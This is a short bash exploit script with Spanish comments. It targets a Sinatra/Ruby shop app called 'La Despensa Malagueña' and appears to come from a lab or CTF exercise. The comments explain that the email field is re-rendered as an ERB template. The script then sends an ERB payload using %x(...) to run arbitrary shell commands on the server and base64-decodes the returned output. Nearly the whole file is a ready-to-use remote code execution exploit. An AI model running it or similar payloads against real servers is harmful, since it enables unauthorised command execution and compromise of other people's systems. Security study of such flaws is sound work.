#!/bin/bash
# rce_via_ssti.sh
#
# Ejecuta comandos arbitrarios en el servidor explotando la inyección
# SSTI (Server-Side Template Injection) en POST /coupon de la app
# "La Despensa Malagueña" (Sinatra/Ruby).
#
# Causa raíz: el valor de `email` se interpola dentro de un mensaje de
# confirmación que luego se vuelve a evaluar como plantilla ERB
# (ERB.new(mensaje).result(binding)), permitiendo ejecutar Ruby
# arbitrario -> `%x(...)` para ejecutar comandos de shell.
#
# La salida se codifica en Base64 en el propio servidor antes de
# devolverse, para evitar que caracteres especiales (<, >, comillas)
# se corrompan al pasar por el escapado HTML de la respuesta.
#
# Uso:
#   TARGET_URL=https://host:puerto ./rce_via_ssti.sh "comando a ejecutar"

set -euo pipefail

TARGET_URL="${TARGET_URL:?Define TARGET_URL, p.ej. https://target.example:8888}"
CMD="${1:?Uso: $0 \"comando\"}"

RESPONSE=$(curl -sk -X POST "${TARGET_URL}/coupon" \
  --data-urlencode "email=<%= %x((${CMD}) | base64 -w0) %>")

echo "$RESPONSE" \
  | grep -oP '(?<=straight to ).*?(?= before the kettle boils)' \
  | base64 -d
echo
